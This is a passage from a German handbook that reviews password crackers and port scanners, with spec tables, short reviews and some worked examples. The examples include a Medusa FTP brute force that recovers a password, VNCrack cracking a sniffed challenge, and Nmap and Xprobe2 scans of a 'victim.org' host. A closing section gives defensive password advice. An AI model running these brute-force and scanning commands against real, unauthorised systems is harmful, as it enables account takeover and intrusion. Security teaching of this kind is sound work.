und Web Formulare. Ein Login-Brute-Force, durchgef\u00fchrt auf einen FTP-Server mit den Parametern \u2022\n-h (target hostname or IP address)\n\u2022\n-U (file containing usernames to test)\n2.3 Medusa\n\u2022\n-P (file containing passwords to test)\n\u2022\n-f (stop scanning host after first valid username/password found)\n\u2022\n-M (name of the module to execute (without the .mod extension))\n33\nbringt folgendes Ergebnis: root@discordia:/home/hydra# medusa -h ftp.victim.org -U usernames.lst -P password.lst -f -M ftp Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: ftplog (1 of 25225 complete) ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: login (2 of 25225 complete) ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: root (3 of 25225 complete) NOTICE: [ftp.mod] Socket is no longer valid. Server likely dropped connection. Establishing new session. ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: password (4 of 25225 complete) (...) ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: Cisco (23174 of 25225 complete) ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: system (23175 of 25225 complete) NOTICE: [ftp.mod] Socket is no longer valid. Server likely dropped connection. Establishing new session. ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: NULL (23176 of 25225 complete) ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: changeme (23177 of 25225 complete) ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: changeme2 (23178 of 25225 complete) NOTICE: [ftp.mod] Socket is no longer valid. Server likely dropped connection. Establishing new session. ACCOUNT CHECK: [ftp] Host: ftp.victim.org (1 of 1, 0 complete) User: vkunzmann (1 of 30, 0 complete) Password: thekingisdead (23179 of 25225 complete) ACCOUNT FOUND: [ftp] Host: ftp.victim.org User: vkunzmann Password: thekingisdead [SUCCESS] root@discordia:/home/hydra#\nBild 2.4: Medusa beim Brechen eines FTP-Zugangs unter Verwendung einer Passwortliste\n34\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\n2.4\nVNCrack\nAnbieter\nwww.phenoelitus.org/fr/tools.html\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows\nSprachen\nEnglisch\nKategorie(n)\nPassword-Cracker (VNC)\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Schnittstellen Ja\nUsability\nInstallation / Kompilation\nKnow-how\nCMD x\nVNCrack ist ein Password-Cracker, der Attacken auf VNC-Server (online) und/oder auf mitgeschnittene VNC-Password-Challenges (offline) durchf\u00fchrt. Hierbei bedient sich VNCrack W\u00f6rterbuch- und Brute-Force-Angriffen. In unserem Beispiel wird VNCrack auf eine durch dsniff gewonnene VNC-Password-Challenge angesetzt: \u2022\n-c challenge from PHoss output\n\u2022\n-r response from PHoss output\n\u2022\n-w wordlist.txt\ndiscordia:~# ./vncrack -c 803ddab86c1d8fd69e1d094113ddb1cf -r 6219eca12720ee27c7c3397de9f0222e -w /usr/share/john/password.lst VNCrack \u2013 by Phenoelit (http://www.phenoelit.de/) $Revision: 1.21 $ ----------------------------------Wordlist failed \u2013 going brute force ----------------------------------depth I depth II depth III depth IV depth V >>>>>>>>>>>>>>> Password: abcos >>>>>>>>>>>>>>>\nBild 2.5: Password-Cracker VNCrack beim Brechen einer VNC-Password-Challenge\n2.5 PWDUMP (in unterschiedlichen Versionen bis PWDUMP7)\n2.5\n35\nPWDUMP (in unterschiedlichen Versionen bis PWDUMP7)\nAnbieter\ndiverse\nPreis\n-\nBetriebssystem(e)\nWin XP, Win 2000, Win2003, Win NT, Vista\nSprachen\nEnglisch\nKategorie(n)\nPassword Dumper\nOberfl\u00e4che\nGr\u00f6\u00dfe\n28 KB bis 1268 KB\nNein\nUsability\nInstallation\nGUI\nCMD x\nSchnittstellen\nKnow-how\nPWDUMP und seine zahlreichen Klone7 nebst FGDUMP8 gestatten das Auslesen und Speichern von Windows-Passw\u00f6rtern, die in der SAM-Datei in Form von Hashes gespeichert sind. Als Anwender erspart man sich damit das m\u00fchselige Extrahieren dieser Daten aus der Registry. F\u00fcr den Remotezugriff auf ein externes Zielsystem ist u. a. PWDUMP3 gedacht, das im Grunde \u00fcber die gleiche Funktionalit\u00e4t verf\u00fcgt.\nBild 2.6: Ausgabe der Password-Hashes auf Konsole oder Datei\n7\nwww.openwall.com/passwords/microsoft-windows-nt-2000-xp-2003-vista\n8\nwww.foofus.net/fizzgig/fgdump/\n36\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\n2.6\nJohn the Ripper\nAnbieter\nwww.openwall.com/john\nBetriebssystem(e) Win XP, Win 2000,\nPreis\n-\nSprachen\nEnglisch\nWin2003, Win NT, Mac OS X, Linux Kategorie(n)\nPassword-Cracker\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 10 MB\nNein\nUsability\nInstallation / Kompilation\nGUI\nCMD\nx\nSchnittstellen\nKnow-how\nJohn the Ripper (JtR) ist ein sehr universeller und schneller Passwortknacker, der f\u00fcr sehr viele Betriebssystemplattformen verf\u00fcgbar ist. Seine grundlegenden Modi sind: \u2022\nSingle Crack Mode (versucht Passw\u00f6rter zu erraten, z. B. auf Basis der Loginnamen)\n\u2022\nWordlist Mode (der klassische Dictionary-Angriff)\n\u2022\nIncremental Mode (auf Basis von beliebigen Zeichenkombinationen)\nIn der Pro-Variante kommen hinzu: \u2022\nTraditional DES-based Unix crypt(3) \u2013 most commercial Unix systems (Solaris, AIX, ...), Mac OS X 10.2, ancient Linux and *BSD\n\u2022\n\u00bbbigcrypt\u00ab \u2013 HP-UX, Tru64 / Digital Unix / OSF/1\n\u2022\nBSDI-style extended DES-based crypt(3) \u2013 BSD/OS, *BSD (non-default)\n\u2022\nFreeBSD-style MD5-based crypt(3) \u2013 most Linux, FreeBSD, NetBSD, Cisco IOS, OpenBSD (non-default)\n\u2022\nOpenBSD-style Blowfish-based crypt \u2013 OpenBSD, some Linux, other *BSD and Solaris 10 (non-default)\n\u2022\nKerberos AFS DES-based hashes\n\u2022\nLM (LanMan) DES-based hashes \u2013 Windows NT/2000/XP/2003, Mac OS X 10.3\n\u2022\nNTLM MD4-based hashes \u2013 Windows NT/2000/XP/2003/Vista (new in 1.7.3 Pro)\n\u2022\nMac OS X 10.4+ salted SHA-1 hashes (new in 1.7.3 Pro)\n2.7 OphCrack\n37\nBild 2.7: John im Single Crack Mode\n2.7\nOphCrack\nAnbieter\nhttp://ophcrack.sourceforge.net\nPreis\n-\nBetriebssystem(e)\nWin XP, Win 2000, Win2003, Win NT, XP, Vista, Mac OS x, Linux\nSprachen\nEnglisch\nKategorie(n)\nPassword-Cracker auf der Basis von Rainbow Tables\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 6 MB\nJa\nUsability\nInstallation /\nx\nCMD\nx\nSchnittstellen\nKnow-how\nF\u00fcr Ophcrack existiert eine breite Reihe von Tables (auch von deutschsprachigen Varianten) f\u00fcr das Passwort-Cracken. Au\u00dferdem gibt es die M\u00f6glichkeit, kostenlos eine Live-CD mit entsprechenden Werkzeugen herunterzuladen. Dank der grafischen Benutzeroberfl\u00e4che und guter Bedienungslogik ist es das Mittel der Wahl.\n38\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\nBild 2.8: Passwortknacker mit grafischer Oberfl\u00e4che, vielen Schnittstellen und kostenlosen Tables\n2.8\nSAMInside\nAnbieter\nwww.insidepro.com\nTrial, ab 29,95 \u20ac\nPreis\nBetriebssystem(e) Win XP, Win 2000, Win2003, Sprachen Win NT, Win Vista, Win 7 Kategorie(n)\nPassword-Cracker\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 1 MB\nNein\nUsability\nInstallation /\nKnow-how\nEnglisch GUI\nSchnittstellen\nx\nCMD\nPWDUMP2, LC5\nMit dem in Assembler geschriebenen SAMInside k\u00f6nnen Benutzerpassw\u00f6rter in allen neueren Windows-Versionen schnell und unkompliziert wiederhergestellt werden. Dem Angreifer stehen dabei zur Verf\u00fcgung: die Brute-Force-Methode, Mask-Attacken, W\u00f6rterbuchattacken und Angriffe anhand zuvor berechneter Tabellen (Rainbow Tables). Auf der Seite des Herstellers k\u00f6nnen zus\u00e4tzliche Dictionaries (in fast allen Sprachen) heruntergeladen werden. Einfache alphanumerische Kennw\u00f6rter knackt das Programm innerhalb von Sekunden:\n2.9 Cain & Abel\n39\nBild 2.9: Der schnellste Passwortknacker f\u00fcr Windows\n2.9\nCain & Abel\nAnbieter\nwww.oxid.it\nPreis\n-\nBetriebssystem(e)\nWin XP, Win 2000, Win NT, Win Vista, Win 7\nSprachen\nEnglisch\nKategorie(n)\nPassword-Cracker\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 1 MB\nJa\nUsability\nInstallation /\nx\nCMD\nSchnittstellen\nKnow-how\nDer in Software gegossene Albtraum von Systemverwaltern und Netzwerkadministratoren: Der Password-Sniffer und -Cracker, inklusive Remote-Steuerung und Zugriff auf die meisten Securityprotokolle. Gerade bei simpel gestrickten oder gecachten Passw\u00f6rtern (f\u00fcr Freigaben, Webshares etc.) kommt Cain & Abel sehr schnell zur Sache. Nat\u00fcrlich k\u00f6nnen auch die Admin-Passw\u00f6rter \u00fcber verschiedene Methoden inklusive des Einsatzes von Rainbow Tables (online) geknackt werden.\nBild 2.10: Cain & Abel \u2013 der Universalknacker f\u00fcr Netz- und sonstige Passw\u00f6rter\n40\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\n2.10\nL0phtcrack\nAnbieter\nwww.l0phtcrack.com\nBetriebssystem(e)\nWin XP, Win 2000, Win2003, Sprachen Win NT, Win Vista, Win 7\nKategorie(n)\nPassword-Cracker\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 20 MB\nJa\nUsability\nInstallation / Kompilation\nPreis\nKnow-how\n15 Tage Trial \u2013 Lizenz ab 295 $ Englisch GUI\nSchnittstellen\nx\nCMD\nJa\nAuferstanden aus Ruinen: LC6 \u2013 der Nachfolger des legend\u00e4ren Passwortcrackers L0phtcrack, der nach der \u00dcbernahme durch Symantec vom Markt verschwand, ist wieder da, nachdem die Entwickler die Rechte zur\u00fcck gekauft haben. Die Version 6 kommt nun auch mit 64-Bit-Versionen von Windows und Mehrkernsystemen klar, Rainbow Tables werden ebenfalls unterst\u00fctzt. Die Auswertungsergebnisse werden in einem Report grafisch angezeigt.\nBild 2.11: Graphische Auswertung von LC6\n2.11 Distributed Password Recovery\n2.11\n41\nDistributed Password Recovery\nAnbieter\nwww.elcomsoft.de\nPreis\nTestversion; ab 599 \u20ac\nBetriebssystem(e)\nWin XP, Win Server 2003, Win Vista, Win 7\nSprachen\nDeutsch\nKategorie(n)\nPassword-Cracker, linear skalierbar, unterst\u00fctzt bis zu 64 CPUs oder Prozessorkerne sowie bis zu 32 GPUs in einem Rechner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 10 MB\nJa\nUsability\nInstallation /\nGUI\nx CMD\nSchnittstellen\nKnow-how\nVon Elcomsoft kommt eines der cleversten und schnellsten Programme zur Passwortwiederherstellung auf dem internationalen Markt. Insbesondere durch den kombinierten Einsatz verteilter Workstations sowie durch den Einsatz der Hardwarebeschleunigung von GeForce-Grafikkarten (GPU) k\u00f6nnen auch komplexe Passwortchiffren binnen eines ertr\u00e4glichen Zeitraums gebrochen worden.\n2.12\nOffline NT Password & Registry Editor\nAnbieter\nhttp://pogostick.net/~pnh/ ntpasswd\nPreis\n-\nBetriebssystem(e) Win XP, Win 2000, Win2003, Win NT, Win Vista, Win 7\nSprachen\nEnglisch\nKategorie(n)\nPassword-Cracker\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 5 MB\nNein (ISODatei)\nUsability\nInstallation / Kompilation\nCMD x\nSchnittstellen\nKnow-how\nIm eigentlichen Sinn kein Passwort-Knacker, sondern ein Werkzeug, um die Folgen vergessener Kennw\u00f6rter ungeschehen zu machen. Nach dem Erstellen einer Startdisk werden alle im System befindlichen Accounts aufgelistet. Man kann jetzt ein Administratorkonto anw\u00e4hlen und das zugeh\u00f6rige Passwort \u00fcberschreiben oder neu setzen und im Anschluss daran wieder auf den Rechner mit administrativen Rechten zugreifen.\n42\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\n2.13\nPW-Inspector (Hydra-Suite)\nAnbieter\nhttp://freeworld.thc.org\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows\nSprachen\nEnglisch\nKategorie(n)\nPasswordlisten-Optimimierer\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nCMD x\nSchnittstellen\nKnow-how\nPW-Inspector aus der Hydra-Suite ist \u2013 neben den Kommandos sort und uniq \u2013 ein leistungsf\u00e4higes Tool zum Optimieren von Passwortlisten. Nur selten sind aus dem Internet bezogene Passwortlisten f\u00fcr den jeweiligen Einsatzzweck optimiert. Auch Doubletten nehmen unn\u00f6tig viel Zeit und Rechenpower in Anspruch, ohne jedoch zu einem besseren Ergebnis beizutragen. Besteht das Ziel einer W\u00f6rterbuchattacke beispielsweise darin, einen WPA2-Schl\u00fcssel zu errechnen, w\u00e4re die Ber\u00fccksichtigung des Bereichs von 1 \u2013 7 Zeichen t\u00f6richt, da dieser bei WPA2 gar keine Anwendung findet. In unserem Beispiel weisen wir PW-Inspector in Verbindung mit cat dazu an, ausschlie\u00dflich den Zeichenraum von 8 \u2013 63 Zeichen unserer Passwortliste beizubehalten: \u2022\n-m (minimum length of a valid password)\n\u2022\n-M (maximum length of a valid password)\nroot@discordia:~# cat password.lst | pw-inspector -m 8 -M 63 > all_863_password_8-63.lst root@discordia:~#\nBild 2.12: PW-Inspector beim Optimieren einer Passwortliste\n2.14\nAbwehr \u2013 generelle Tipps\nWer verhindern will, dass seine Dokumente und Zugangspassw\u00f6rter von nicht legitimierten Personen bzw. Institutionen entschl\u00fcsselt werden, sollte sich insbesondere den Zusammenhang von Passwortl\u00e4nge und Brute-Force-Attacken9 vergegenw\u00e4rtigen. Nehmen wir an, wir nutzten f\u00fcr ein siebenstelliges Passwort einen Zeichenvorrat von 26 7 Zeichen. Theoretisch ergibt das 26 = 8.031.810.176 Kombinationen \u2013 f\u00fcr Laien eine unvorstellbar gro\u00dfe, Sicherheit vorgaukelnde Zahl. Sie relativiert sich, wenn man davon ausgeht, dass der schnellste Einzel-PC mit Spezialsoftware etwa 800 \u2013 850 Millionen10 Kennw\u00f6rter pro Sekunde generieren kann (Stand Ende Dezember 2009). Dieser\n9\nvgl. den sehr instruktiven Aufsatz unter www.1pw.de/brute-force.html\n10\nvgl. Nr. 2, Mai 2009, Passwort 2010 \u2013 Sichere Gestaltung und Verwaltung von Passw\u00f6rtern, S. 6. ff.\n2.14 Abwehr \u2013 generelle Tipps\n43\nbr\u00e4uchte weniger als 10 Sekunden, um das Passwort zu knacken. W\u00e4re indes der 8 Schl\u00fcssel nur ein Zeichen l\u00e4nger, k\u00e4me man bereits auf 26 , das sind mehr als 208 Milliarden unterschiedlicher Kombinationen, wodurch der Entschl\u00fcsselungsaufwand auf ca. 4 Minuten ansteigen w\u00fcrde. Passw\u00f6rter, die Klein- und Gro\u00dfbuchstaben sowie Zahlen nutzen (62 Zeichen) und eine L\u00e4nge von z. B. zw\u00f6lf Zeichen aufwiesen, br\u00e4uchten zur Entschl\u00fcsselung \u00fcber 126 000 Jahre. Gegen W\u00f6rterbuchattacken verteidigt man sich am besten durch nichtsemantische Wortphrasen, z. B. \u00bbI,PK,b1954iG,Rhg\u00ab (steht f\u00fcr den Merksatz \u00bbIch, Peter Kraft, bin 1954 in Guntersblum, Rheinhessen geboren\u00ab. Da sich solche Passw\u00f6rter aber letztlich nur schwer memorieren lassen, verwendet man daf\u00fcr am besten einen sicheren Passwortsafe, wie z. B. KeePass (kostenlos unter http://keepass.info). Gegen den Einsatz vorberechneter Hash-Werte via Rainbow Tables11 sch\u00fctzt ebenfalls die Verwendung einer langen, nicht sprechenden Passwortphrase. Der Einsatz schwacher, leicht zu brechender Passw\u00f6rter durch Anwender ist insbesondere f\u00fcr Firmen problematisch. Hier bedarf es konkreter Passwortrichtlinien (L\u00e4nge, Symbolraum, Wechselrhythmus etc.), die auf Wirksamkeit regelm\u00e4\u00dfig in Audits \u00fcberpr\u00fcft werden, sowie Tools, die eine einfache und sichere Speicherung von Passw\u00f6rtern verwalten k\u00f6nnen.\n11\nVgl. Peter Kraft. Anti Hackerz Book 2009, Kapitel 11.4, Schutz vor Passwortattacken, Poing 2008, S. 256 \u2013 260\n45\n3\nAn den Toren r\u00fctteln: Portscanner & Co.\nPortscanner testen, welche Dienste ein mit TCP/IP oder UDP arbeitendes System nach au\u00dfen anbietet. Obwohl sich mit exzessiven Portscans auch Puffer\u00fcberl\u00e4ufe und Systemcrashs auf dem Zielrechner provozieren lassen \u2013 man spricht hier von Denial of Service-Angriffen \u2013, z\u00e4hlen Portscanner nicht per se zu den klassischen Einbruchswerkzeugen. Ihre Berechtigung haben sie vorzugsweise dort, wo man schnell seine eigenen Rechner auf m\u00f6gliche Dienste und deren Verwundbarkeit checken will, ohne gleich zu einem Security-/Vulnerability-Scanner, wie sie u. a. f\u00fcr Sicherheitsaudits benutzt werden, zu greifen. F\u00fcr Angriffe auf fremde Rechner (Hosts) sind u. a. folgende Szenarien denkbar: TCP Connect Scan Die bekannteste und einfachste Scanmethode mittels des connect()-Systemaufrufs f\u00fcr den Portscan. Bei einem erfolgreichen Systemaufruf auf der anderen Seite kann auf einen offenen Port als potenzielles Angriffsziel geschlossen werden. Obwohl die Verbindung mit close() sofort wieder geschlossen wird, wird diese meistens hostseitig protokolliert, d. h., der Ursprung des Portscans kann zur\u00fcckverfolgt werden. Kam keine Verbindung zustande, ist der Port des Zielrechners geschlossen und scheidet damit als Angriffsziel aus. TCP SYN Scan Gelegentlich auch als Stealth- oder als halb offener Scan bezeichnet, da keine vollst\u00e4ndige TCP-Verbindung zum Zielrechner aufgebaut wird. Im ersten Schritt sendet der Angreifer ein SYN-Paket an den Host und gibt damit vor, eine normale Verbindung aufbauen zu wollen. Schickt der Host ein SYN|ACK-Paket, steht der Port offen; sendet er dagegen ein RST-Paket, ist der Port geschlossen. In beiden F\u00e4llen verneint der Angreifer einen angebotenen Verbindungsaufbau. Empf\u00e4ngt der Angreifer \u00fcberhaupt kein Paket, ist auf der Gegenstation ein Paketfilter vorgeschaltet. Gro\u00dfer Vorteil dieser Technik: Die Verbindungstests bleiben in den allermeisten F\u00e4llen unentdeckt; der Angreifer bleibt im Dunkeln. TCP FIN/NULL/XMAS Scan Auch hier erfolgt kein direkter Verbindungsaufbau, sondern der Angreifer analysiert das Zielsystem hinsichtlich seines Verhaltens auf Folgepakete. Werden diese ignoriert, ist der Port offen, im anderen Fall wird ein Reset-Paket gesendet. Gegen Windows-Rechner ist diese Scantechnik wirkungslos.\n46\nKapitel 3 \u2013 An den Toren r\u00fctteln: Portscanner & Co.\nUDP Scans Da das Protokoll UDP verbindungslos arbeitet, kann man die entsprechenden Ports nicht direkt scannen. UDP-Scanner schicken stattdessen ein leeres Paket an die entsprechenden Ports. Wenn keine Antwort zur\u00fcckkommt, ist der Port offen, und es kommt stattdessen die ICMP-Fehlermeldung \u00bbPort unreachable\u00ab. Nachteil dieser Methode: Sie ist sehr zeitaufwendig, da die Zielsysteme entsprechende Fehlermeldungen restriktiv handhaben, um DoS-Angriffe besser abwehren zu k\u00f6nnen. Wie wir bereits gesagt haben, sind Portscanner nicht per definitionem Angriffswerkzeuge; sie erlauben es aber, Rechner im Netz nach m\u00f6glichen Schwachstellen wie offenen Ports (die man dann gezielter attackieren kann) abzuklopfen. Stellen Sie sich vor, es geht ein Mann \u00fcber einen Parkplatz und stellt fest, welche PKWs unverschlossen sind. Das Ergebnis vermerkt er dann in einem Heft, wo hinter der Angabe des Kennzeichens zum Ankreuzen vermerkt ist: Fahrert\u00fcr offen/verschlossen; Beifahrert\u00fcr offen/verschlossen etc. Eine weitere Aktion erfolgt nicht. Strafbar sind beide Versuche indes nicht, obwohl sie nat\u00fcrlich den eigentlichen Einbruchsversuch einleiten k\u00f6nnen. Wie so oft ist es eine Frage des Vorsatzes. Bei der Auswahl von Portscannern sind folgende Gesichtspunkte wichtig: \u2022\nSchnelligkeit\n\u2022\nAuswahl gro\u00dfer Adressbereiche\n\u2022\nEignung f\u00fcr bestimmte Zielsysteme\n\u2022\nMapping der verwendeten Dienste\n\u2022\nBedienungskomfort (GUI statt Kommandozeile)\n\u2022\nDirekte Connectm\u00f6glichkeit bei freigegebenen Shares, z. B. \u00fcber Port 139\nIn diese Rubrik haben wir auch die Spurensucher im Netz, die Fingerprinting Tools, aufgenommen. Fingerprints sind Abdr\u00fccke, die ein Host im Netzwerk hinterl\u00e4sst. Aufgrund von u. a. TCP, UDP und ICMP-Anfragen versuchen solche Tools dem Anwender bzw. Angreifer einen Anhaltspunkt zu geben, was f\u00fcr ein Betriebssystem bzw. welche Kernelversion auf dem Zielsystem l\u00e4uft, wodurch sich dann geeignete Angriffsstrategien ausarbeiten lassen. Vorteil: Viele Fingerprinter arbeiten passiv und werden dadurch vom Zielsystem nicht geloggt.\n3.1\nNmap\nAnbieter\nhttp://nmap.org\nPreis\n-\nBetriebssystem(e)\nLinux, Microsoft Windows, FreeBSD, OpenBSD, Solaris, IRIX, Mac OS X, HP-UX, NetBSD, Sun OS, Amiga, iPhone\nSprachen\nEnglisch\nKategorie(n)\nPortscanner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 5 MB\nUsability\nInstallation / Kompilation\nNein / Ja\nKnow-how\nGUI\nSchnittstellen\nx CMD x\n3.1 Nmap\n47\nNmap (\u00bbNetwork Mapper\u00ab) ist ein \u00fcberaus beliebtes und leistungsf\u00e4higes Tool zum Scannen und Auswerten von Hosts und wird f\u00fcr eine Vielzahl von Plattformen angeboten. Nmap beherrscht neben diversen Scantechniken das aktive Fingerprinting, mit dem das auf dem Zielhost eingesetzte Betriebssystem erkannt werden kann. Nmap arbeitet traditionell textbasiert, kann jedoch mit der grafischen Benutzeroberfl\u00e4che Zenmap erweitert werden. In unserem Beispiel wird Nmap mit folgenden Parametern gestartet: \u2022\n-PN (Treat all hosts as online -- skip host discovery)\n\u2022\n-sS (SYN Stealth Scan)\n\u2022\n-O (Enable OS detection)\n\u2022\n-A (Enables OS detection and Version detection, Script scanning and Traceroute)\nroot@discordia:~# nmap -PN -sS -O -A firewall.victim.org Starting Nmap 5.20 ( http://nmap.org ) at 2010-03-17 20:03 CET Nmap scan report for firewall.victim.org (213.172.16.20) Host is up (0.00048s latency). Not shown: 995 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 2.0) | ssh-hostkey: 1024 cc:83:ec:46:f6:6a:bf:5c:e0:3b:d7:93:9b:db:40:4c (DSA) |_1024 5b:90:15:f6:50:ff:40:d4:55:ca:48:fa:8e:bd:d5:00 (RSA) 53/tcp open domain dnsmasq 2.45 80/tcp open http Apache httpd 3001/tcp open ssl/ntop-http Ntop web interface 3.3 |_sslv2: server still supports SSLv2 3128/tcp open http-proxy Squid webproxy 2.6.STABLE18 MAC Address: 00:02:B3:8E:03:8A (Intel) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: firewall Running: IPCop Linux 2.4.X OS details: IPCop firewall 1.4.10 \u2013 1.4.21 (Linux 2.4.31 \u2013 2.4.36) Network Distance: 1 hop Service Info: OS: Linux HOP RTT ADDRESS 1 0.48 ms firewall.victim.org (213.172.16.20) OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 51.92 seconds root@discordia:~#\nBild 3.1: Nmap beim Scannen eines Rechners\n48\nKapitel 3 \u2013 An den Toren r\u00fctteln: Portscanner & Co.\n3.2\nLanspy\nAnbieter\nhttp://lantricks.com\nPreis\n-\nBetriebssystem(e)\nWin2003, WinXP, Win Vista, Win 7\nSprachen\nEnglisch\nKategorie(n)\nPortscanner\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nOberfl\u00e4che Installation\nJa\nGUI\nx\nCMD\nSchnittstellen\nKnow-how\nLanspy ist ein leistungsf\u00e4higer und schneller IP-Scanner, der sowohl zur Analyse des eigenen Netzwerks als auch externer Netwerke eingesetzt werden kann. Die Scan-Ergebnisse werden in sehr \u00fcbersichtlicher Form pr\u00e4sentiert.\nBild 3.2: \u00dcbersichtliches Scanresultat des eigenen Heimnetzwerks\n3.3 AW Security Portscanner\n3.3\n49\nAW Security Portscanner\nAnbieter\nwww.atelierweb.com\nPreis\nTrial, ab $ 33,95\nBetriebssystem(e)\nWindows XP, Win Vista, Win 7\nSprachen\nEnglisch\nKategorie(n)\nPortscanner\nGr\u00f6\u00dfe\n< 2 KB\nUsability\nOberfl\u00e4che Installation\nja Know-how\nGUI\nx\nCMD\nSchnittstellen\nNeben ordentlichen Analysewerkzeugen f\u00fcr das lokale Netz (Anzeige von Ports, Routings, IP-Protokollen, Registryeinstellungen f\u00fcrs Netzwerk, Freigaben, User, Services etc.) verf\u00fcgt der Scanner auch \u00fcber ein weitreichendes Angriffsrepertoire, womit er sich in der Mitte zwischen einfachen Portscannern (Superscan) und komplexen SecurityScannern (GFI, OpenVAS, Nessus oder X-Scan) bewegt.\nBild 3.3: Der AW Security Portscanner ist f\u00fcr Angriffs- und Verteidigungszwecke gleich gut geeignet\n50\nKapitel 3 \u2013 An den Toren r\u00fctteln: Portscanner & Co.\n3.4\nWinfingerprint\nAnbieter\nhttp://winfingerprint.com\nPreis\n-\nBetriebssystem(e)\nWin2000, WinXP, Win2003, Win NT 4.0\nSprachen\nEnglisch\nKategorie(n)\nFingerprinting Tool\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nJa\nUsability\nInstallation\nKnow-how\nGUI\nSchnittstellen\nx\nCMD\nWinPCap\nNach Eingabe einer IP-Liste, einer IP-Range, des Hosts oder der Netzwerkumgebung scannt das Programm andere ans Netz angeschlossene Rechner und gibt \u2013 je nach Voreinstellung \u2013 einen ausf\u00fchrlichen Report \u00fcber das Zielsystem, der auch gespeichert werden kann.\nBild 3.4: Beim Abdruck sammeln\n3.5 Xprobe2\n3.5\n51\nXprobe2\nAnbieter / Entwickler\nhttp://xprobe.sourceforge.net\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Solaris, FreeBSD, OpenBSD, NetBSD, IRIX\nSprachen\nEnglisch\nKategorie(n)\nOS Fingerprinting Tool\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nGUI\nCMD x\nSchnittstellen\nKnow-how\nXprobe2 beherrscht aktives Fingerprinting, mit dem das auf dem Zielhost eingesetzte Betriebssystem erkannt werden kann. Dabei kombiniert Xprobe2 verschiedene Methoden unter Benutzung des ICMP-Protokolls von einer errechneten Wahrscheinlichkeit bis hin zur Einbindung einer Signaturdatenbank. Eine neue Version namens XprobeNG (auch als Xprobe2++ bekannt) ist f\u00fcr den Sommer des Jahres 2010 angek\u00fcndigt. Eine Abfrage, angesetzt auf den ge\u00f6ffneten Port UDP/161 von victim.org \u2022\n-p (specify portnumber, protocol and state)\nbringt folgendes Ergebnis:\nroot@discordia:~# xprobe2 -p udp:161:open victim.org Xprobe2 v.0.3 Copyright (c) 2002-2005\n[[email protected]](/cdn-cgi/l/email-protection)\n,\n[[email protected]](/cdn-cgi/l/email-protection)\n,\n[[email protected]](/cdn-cgi/l/email-protection)\n[+] Target is victim.org [+] Loading modules. [+] Following modules are loaded: [x] [1] ping:icmp_ping \u2013 ICMP echo discovery module [x] [2] ping:tcp_ping \u2013 TCP-based ping discovery module [x] [3] ping:udp_ping \u2013 UDP-based ping discovery module [x] [4] infogather:ttl_calc \u2013 TCP and UDP based TTL distance calculation [x] [5] infogather:portscan \u2013 TCP and UDP PortScanner [x] [6] fingerprint:icmp_echo \u2013 ICMP Echo request fingerprinting module [x] [7] fingerprint:icmp_tstamp \u2013 ICMP Timestamp request fingerprinting module [x] [8] fingerprint:icmp_amask \u2013 ICMP Address mask request fingerprinting module [x] [9] fingerprint:icmp_port_unreach \u2013 ICMP port unreachable fingerprinting module [x] [10] fingerprint:tcp_hshake \u2013 TCP Handshake fingerprinting module [x] [11] fingerprint:tcp_rst \u2013 TCP RST fingerprinting module [x] [12] fingerprint:smb \u2013 SMB fingerprinting module\n52\nKapitel 3 \u2013 An den Toren r\u00fctteln: Portscanner & Co.\n[x] [13] fingerprint:snmp\n\u2013\nSNMPv2c fingerprinting module\n[+] 13 modules registered [+] Initializing scan engine [+] Running scan engine [-] ping:tcp_ping module: no closed/open TCP ports known on victim.org. Module test failed [-] No distance calculation. victim.org appears to be dead or no ports known [+] Host: victim.org is up (Guess probability: 66%) [+] Target: victim.org is alive. Round-Trip Time: 0.01510 sec [+] Selected safe Round-Trip Time value is: 0.03021 sec [-] fingerprint:tcp_hshake 